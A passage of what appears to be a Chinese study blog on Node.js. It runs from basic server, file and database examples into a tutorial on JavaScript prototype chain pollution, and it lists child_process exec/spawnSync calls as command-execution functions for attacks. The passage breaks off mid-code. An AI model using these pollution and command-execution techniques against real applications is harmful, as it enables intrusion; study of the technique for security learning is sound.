class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printHello</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-built_in">console</span>.log( <span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 两秒后执行以上函数</span><br><span class="hljs-keyword">var</span> t = <span class="hljs-built_in">setTimeout</span>(printHello, <span class="hljs-number">2000</span>);<br><br><span class="hljs-comment">// 清除定时器</span><br><span class="hljs-built_in">clearTimeout</span>(t);<br></code></pre></td></tr></table></figure><p>setlnterval(function(),ms)<br>clearlnterval(t)<br>和上面的两个一样 不同的是 setlntercal 会一直调用函数 直至 clearlnterval 调用或窗口关闭</p><p>process 是 global 的属性 也是全局变量有四个事件<br>exit before uncaughException Signal</p><h2 id="十二、文件-异步"><a href="#十二、文件-异步" class="headerlink" title="十二、文件-异步"></a>十二、文件-异步</h2><p>导入文件系统模块<br><code>var fs = require(&quot;fs&quot;)</code></p><ul><li>读取 input.txt</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>   <span class="hljs-keyword">if</span> (err) &#123;<br>       return console.error(err);<br>   &#125;<br>   console.log(<span class="hljs-string">&quot;异步读取: &quot;</span> + data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>类似地有函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">打开<br>fs<span class="hljs-selector-class">.open</span>(path, flags<span class="hljs-selector-attr">[, mode]</span>, callback)<span class="hljs-comment">//(flags:r r+ a a+ ......)</span><br><br>写入<br>fs<span class="hljs-selector-class">.writeFile</span>(file, data<span class="hljs-selector-attr">[, options]</span>, callback)<br><br>读取<br>fs<span class="hljs-selector-class">.read</span>(fd, buffer, offset, length, <span class="hljs-attribute">position</span>, callback)<br><br>关闭<br>fs<span class="hljs-selector-class">.close</span>(fd, callback)<br><br>删除<br>fs<span class="hljs-selector-class">.unlink</span>(path, callback)<br><br>还有目录...<br></code></pre></td></tr></table></figure><h2 id="十三、GET-POST-请求"><a href="#十三、GET-POST-请求" class="headerlink" title="十三、GET/POST 请求"></a>十三、GET/POST 请求</h2><p>获取 get 请求的参数</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>&#125;);<br>    res.end(util.inspect(<span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>)));<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>获取 url 的参数</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br><br>    <span class="hljs-comment">// 解析 url 参数</span><br>    <span class="hljs-keyword">var</span> params = <span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>).query;<br>    res.write(<span class="hljs-string">&quot;网站名：&quot;</span> + params.name);<br>    res.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>    res.write(<span class="hljs-string">&quot;网站 URL：&quot;</span> + params.url);<br>    res.end();<br><br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>获取 post 的内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-comment">// 定义了一个post变量，用于暂存请求体的信息</span><br>    <span class="hljs-keyword">var</span> post = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-comment">// 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中</span><br>    req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>)</span>&#123;<br>        post += chunk;<br>    &#125;);<br><br>    <span class="hljs-comment">// 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。</span><br>    req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        post = querystring.parse(post);<br>        res.end(util.inspect(post));<br>    &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>提交 post 表单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><br><span class="hljs-keyword">var</span> postHTML =<br>  <span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Node.js 实例&lt;/title&gt;&lt;/head&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;form method=&quot;post&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;网站名： &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;网站 URL： &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-string">&quot;&quot;</span>;<br>  req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chunk</span>) </span>&#123;<br>    body += chunk;<br>  &#125;);<br>  req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 解析参数</span><br>    body = querystring.parse(body);<br>    <span class="hljs-comment">// 设置响应头部信息及编码</span><br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf8&#x27;</span>&#125;);<br><br>    <span class="hljs-keyword">if</span>(body.name &amp;&amp; body.url) &#123; <span class="hljs-comment">// 输出提交的数据</span><br>        res.write(<span class="hljs-string">&quot;网站名：&quot;</span> + body.name);<br>        res.write(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        res.write(<span class="hljs-string">&quot;网站 URL：&quot;</span> + body.url);<br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 输出表单</span><br>        res.write(postHTML);<br>    &#125;<br>    res.end();<br>  &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><h2 id="十四、Express-框架"><a href="#十四、Express-框架" class="headerlink" title="十四、Express 框架"></a>十四、Express 框架</h2><p>利用 Express 框架<br>实现 GEt 方法提交两个参数和 POST 方法提交两个参数<br>完成文件上传 要本地安装 multer 模块 在目录下能看到上传的文件<br>对 cookie 进行管理 要本地安装 cookie-parser 模块 在服务终端能看到 cookie 信息</p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>以 mysql 为例<br>在一项目中 test.js 文件是 nodejs 与 mysql 的配置信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">var mysql      = require(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br>var <span class="hljs-keyword">connection</span> = mysql.createConnection(&#123;<br>  host     : <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-keyword">user</span>     : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">password</span> : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">database</span> : <span class="hljs-string">&#x27;test&#x27;</span><br>&#125;);<br><br><span class="hljs-keyword">connection</span>.<span class="hljs-keyword">connect</span>();<br><br><span class="hljs-keyword">connection</span>.query(<span class="hljs-string">&#x27;SELECT 1 + 1 AS solution&#x27;</span>, <span class="hljs-keyword">function</span> (error, results, fields) &#123;<br>  <span class="hljs-keyword">if</span> (error) throw error;<br>  console.log(<span class="hljs-string">&#x27;The solution is: &#x27;</span>, results[<span class="hljs-number">0</span>].solution);<br>&#125;);<br></code></pre></td></tr></table></figure><p>如果成功连接数据库的话 输出 2</p><p>可以在其他 js 中查询数据库的信息<br>以查一个表为例 数据库可以自行创建</p><p>启动数据库 查一下<br>然后用 sql.js 查一下 所以可以通过修改<br>里面的 sql=’查询语句’就可以进行数据库操作了</p><p>项目</p><p>也可以 nodejs 安装 MongoDB 来对数据库进行操作</p><h1 id="Prototype-Pollution-Attack"><a href="#Prototype-Pollution-Attack" class="headerlink" title="Prototype Pollution Attack"></a>Prototype Pollution Attack</h1><p>常用的执行函数</p><blockquote><p>require(‘child_process’).spawnSync(‘ls’,[‘.’]).stdout.toString()</p><p>stdout 用来捕获输出</p><p>还有 exec，execSync，spawn，spawnSync(这两个需要 stdout 来捕获输出)</p></blockquote><h2 id="JavaScript-中的对象"><a href="#JavaScript-中的对象" class="headerlink" title="JavaScript 中的对象"></a>JavaScript 中的对象</h2><h3 id="建立对象"><a href="#建立对象" class="headerlink" title="建立对象"></a>建立对象</h3><p>JavaScript 中 建立对象有两种形式</p><ul><li>构造函数创建</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Yuyan Peng&quot;</span>;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br>&#125;<br>student.prototype.a=<span class="hljs-number">3</span>;<br>stu = <span class="hljs-keyword">new</span> student();<br><span class="hljs-built_in">console</span>.log(stu.test());<br><span class="hljs-built_in">console</span>.log(stu.a);<br></code></pre></td></tr></table></figure><ul><li>通过 Object 创建</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();<br>a.c=<span class="hljs-number">3</span><br><span class="hljs-built_in">console</span>.log(a.c)<br></code></pre></td></tr></table></figure><p>对于使用过基于类的语言 (如 Java 或 C++) 的开发人员来说，JavaScript 有点令人困惑，因为它是动态的，并且本身不提供一个 class 实现。（在 ES2015/ES6 中引入了 class 关键字，但那只是语法糖，JavaScript 仍然是基于原型的）。 之前我们所认为的类在 js 中都是用函数来声明的 （事实上 js 不承认类 只是有相应的概念而已 下面为了说明方便 都沿用类的说法） 举个栗子</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">function test（）&#123;<br>    this.a = <span class="hljs-string">&quot;joy&quot;</span><span class="hljs-comment">;</span><br>&#125;<br><br><span class="hljs-attribute">b</span> = new test<span class="hljs-comment">;</span><br>console.log(b.a)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>从上面可以看到 实例化对象 b 后就可以输出 test 类的属性 a 了 我们其实很容易想到构造函数 构造函数就是在 new 一个对象的时候被调用 在这其实就是 js 的一个重要概念——继承，继承的整个对应关系就是这个对象的原型链 所以 <code>test()函数就是类test的构造函数</code></p><p>上面没问题我们继续：</p><h3 id="prototype-和proto"><a href="#prototype-和proto" class="headerlink" title="prototype 和proto"></a>prototype 和<strong>proto</strong></h3><p>一个类中必定有一些方法比如说属性 this.age 把方法定义在构造函数内部：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>    <span class="hljs-built_in">this</span>.show=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)<br>        &#125;<br>    &#125;<br><br>(<span class="hljs-keyword">new</span> student).show();<br></code></pre></td></tr></table></figure><p>再一次看到 new 一个对象就会继承到它的属性 在新开辟的存储空间就已经存放有对应的属性了</p><p>但这样写有一个问题 每当我需要创建一个 student 对象的时候 this.show = function{…}就会执行一次 这个 show 方法是绑定在对象上的 而不是绑定在“类”上的</p><ul><li><input checked="" disabled="" type="checkbox"> prototype<pre><code>用原型 prototype 实现</code></pre></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>&#125;<br><br>Student.prototype.show = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)&#125;<br><br><span class="hljs-keyword">var</span> stu = <span class="hljs-keyword">new</span> Student;<br>stu.show();<br></code></pre></td></tr></table></figure><p>prototype 是类 Student 的一个属性 所有类对象在实例化后都具有和 prototype 中的变量、属性和方法 同时只有类才有 prototype 属性，但是类<code>实例化出来的对象</code>却没有 prototype 不能通过 prototype 访问实例化对象的原型</p><ul><li><input checked="" disabled="" type="checkbox"> __proto__<pre><code>就上例而言 我们可以通过 Student.prototype 访问 Student 类的原型 但是实例化后的对象 stu 是不能通过 prototype 访问原型的 这时候我们使用\_\_proto\_\_来访问实例化对象的原型 stu.\_\_proto\_\_==Student.prototype 看到二者是等价的</code></pre></li></ul><p><strong>在 Java.Script 中 万物皆对象</strong><br>所有的变量，函数，数组，对象都始于 Object 的原型即 Object.prototype 对象的__proto__和类的 prototype 相对应</p><p>特别的 函数也可以使用__proto__因为函数也是对象 后面给予说明</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/n.png"></p><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>在 javascript 中 每个对象的都有一个指向他的原型(prototype)的内部链接 这个原型对象又有它自己的原型，直到 null 为止</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Pt()</span>&#123;<br>    this.b = <span class="hljs-string">&quot;I don&#x27;t know what I&#x27;m up to.&quot;</span><br>&#125;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Pt</span>.</span></span>prototype;<br><br>var ppt = <span class="hljs-keyword">new</span> Pt;<br>ppt.__proto__;<br>ppt.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>;</span></span><br><br></code></pre></td></tr></table></figure><p>可以看出原型链为 ppt-&gt;Pt.prototype-&gt;Object.prototype-&gt;null</p><p>数组<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE2.png"><br>原型链 c-&gt;array.prototype-&gt;Object.prototype-&gt;null<br>函数<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE3.png"><br>原型链 d-&gt;function.prototype-&gt;Object.prototype-&gt;null</p><p>可见 js 中一切皆对象 一切都始于 Object.prototype</p><p>总结一下：</p><ul><li>prototype 是类的属性 所有类对象实例化都会从 prototype 继承属性和方法</li><li>一个对象的__proto__属性指向这个实例化这个对象的类的 prototype 属性</li></ul><p><code>instanceof运算符</code>，它可以用来判断某个构造函数的 prototype 属性是否存在另外一个要检测对象的原型链，下面是 instanceof 运算符的一个实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Pt</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ob</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><br><span class="hljs-keyword">var</span> ppt = <span class="hljs-keyword">new</span> Pt;<br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> Pt)<span class="hljs-comment">//true //ppt.__proto__===Pt.prototype</span><br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> ob)<span class="hljs-comment">//false 因为对象ppt的原型不是Ob</span><br></code></pre></td></tr></table></figure><p>上面说到函数也是一个对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br><br><span class="hljs-keyword">var</span> lib = <span class="hljs-keyword">new</span> hello;<br>lib.test();<br><br><span class="hljs-built_in">console</span>.log(hello <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Object</span>)<span class="hljs-comment">//ture 得证</span><br></code></pre></td></tr></table></figure><h3 id="原型链的变量搜索"><a href="#原型链的变量搜索" class="headerlink" title="原型链的变量搜索"></a>原型链的变量搜索</h3><p>来看一个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;abc&quot;</span>;<br>    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;123&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> j = <span class="hljs-keyword">new</span>(I);<br>I.prototype.c = <span class="hljs-string">&quot;789&quot;</span>;<br><span class="hljs-built_in">console</span>.log(j.c);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211119005530731.png" alt="image-20211119005530731"><br>能看出什么</p><p>实例化 I 后，对象 j 不应该有属性 c，但此时给类对象 I 新增一个属性时，在 j 中也有了 c 属性，这是类与对象中从未见过的</p><p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向 null，如果此时还没有搜索到，就会返回 undefined</p><p>那么此时的原型链就是 j-&gt;I.prototype-&gt;Object.prototype-&gt;null</p><p>js 的这个查找机制 就是运用在面向对象的继承中 称作 prototype 继承链</p><p>⭐ 说到这里再一次总结如下</p><ul><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的__proto__属性，指向类的原型对象 prototype</li><li>JavaScript 使用 prototype 链实现继承机制</li></ul><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>下面我们来看</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var Student = &#123;age:<span class="hljs-number">19</span>&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span></span>age = <span class="hljs-number">20</span><br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br>var Teacher = &#123;&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Teacher</span>.</span></span>age)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png"></p><p>原型链：Student.__proto__-&gt;Object.prototype-&gt;null</p><p>随着上面的逐步探讨 原型链污染及其产生的漏洞也就呼之欲出了 我们通过控制父类甚至祖类的属性(修改这个对象的原型)就可以影响来自同一个类、父祖类的对象 这就是原型链污染</p><p>看一个例子</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//First.a或者First[&#x27;a&#x27;]对数组元素的访问</span><br><span class="hljs-number">1.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">First</span> = Array();<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;aa&#x27;</span>] = <span class="hljs-string">&quot;aaa&quot;</span>;<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;bb&#x27;</span>] = <span class="hljs-string">&quot;bbb&quot;</span>;<br><span class="hljs-built_in">First</span>.aa<br><span class="hljs-built_in">First</span>.bb<br><br><span class="hljs-number">2.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">Second</span> = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;ccc&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;ddd&quot;</span>&#125;<br>typeof <span class="hljs-built_in">Second</span>;<br><span class="hljs-built_in">Second</span>.c<br><span class="hljs-built_in">Second</span>[<span class="hljs-string">&#x27;c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>上面的 prototype 是一样的<br>看一组 Second.__proto__==Second[“__proto__“]=Object.prototype</p><p>所以说，原型链污染一般会出现在对象、或数组的键名或属性名可控,而且是赋值语句的情况下 下面是个失败案例</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 